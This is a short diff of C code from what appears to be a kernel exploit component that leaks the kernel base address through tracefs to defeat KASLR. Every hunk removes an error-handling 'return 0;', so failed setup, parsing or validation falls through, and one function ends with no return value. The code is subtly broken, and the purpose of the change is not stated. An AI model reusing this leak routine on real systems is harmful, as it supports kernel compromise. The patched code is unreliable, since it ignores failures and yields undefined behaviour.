@@ -8,7 +8,6 @@
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
   if (fd < 0) {
-    return 0;
   }
   size_t len = strlen(value);
   ssize_t wrote = write(fd, value, len);
@@ -19,7 +18,6 @@ static int slide_tracefs_write(const char *path, const char *value) {
 static int slide_tracefs_parse_page(
     const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
   if (page_len < 20) {
-    return 0;
   }
 
   uint64_t commit = 0;
@@ -71,7 +69,6 @@ static int slide_tracefs_parse_page(
     }
     pos = record + record_len;
   }
-  return 0;
 }
 
 static int slide_tracefs_leak_kernel_base(void) {
@@ -86,7 +83,6 @@ static int slide_tracefs_leak_kernel_base(void) {
       !slide_tracefs_write(event_enable, "1") ||
       !slide_tracefs_write(tracing_on, "1")) {
     pr_error("slide tracefs setup failed errno=%d\n", errno);
-    return 0;
   }
 
   int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
@@ -119,8 +115,6 @@ static int slide_tracefs_leak_kernel_base(void) {
   }
   slide_tracefs_write(event_enable, "0");
   if (!found) {
-    pr_error("slide tracefs worker caller not found\n");
-    return 0;
   }
 
   slide_p0_offset = candidate;
@@ -143,7 +137,6 @@ int slide_leak_kernel_base(void) {
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
         (value & 0xffffULL) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
-      return 0;
     }
     slide_p0_offset = (uintptr_t)value;
     kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
